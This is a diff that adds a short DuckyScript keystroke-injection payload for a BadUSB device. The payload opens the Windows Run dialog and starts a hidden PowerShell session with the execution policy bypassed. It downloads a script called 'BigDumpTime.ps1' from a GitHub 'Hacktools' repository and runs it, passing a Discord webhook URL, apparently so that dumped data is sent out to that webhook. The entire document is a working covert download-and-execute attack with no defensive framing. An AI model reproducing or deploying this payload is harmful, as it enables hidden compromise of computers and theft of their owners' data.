@@ -1,0 +1,4 @@
+GUI r
+DELAY 800
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb 'https://raw.githubusercontent.com/BlueJuice1/Hacktools/main/BigDumpTime/BigDumpTime.ps1' -OutFile '%TEMP%\\payload.ps1'; powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File '%TEMP%\\payload.ps1' -WebhookUrl 'https://discord.com/api/webhooks/xxx/yyy'"
+ENTER
